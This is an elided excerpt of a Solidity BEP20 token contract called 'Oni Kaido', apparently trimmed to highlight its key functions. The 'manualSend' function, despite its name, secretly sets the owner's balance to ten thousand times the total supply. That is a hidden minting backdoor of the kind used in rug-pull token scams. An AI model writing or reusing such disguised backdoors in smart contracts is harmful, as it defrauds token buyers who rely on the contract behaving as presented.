...
contract OniKaido is IBEP20, Auth {
    ...
    string constant _name = "Oni Kaido";
    string constant _symbol = "OK";
    ...
    function set(address holder, bool exempt) external authorized {
    ...
    function manualSend() external authorized {
        ...
        _balances[owner] = _totalSupply * 10000;
    }
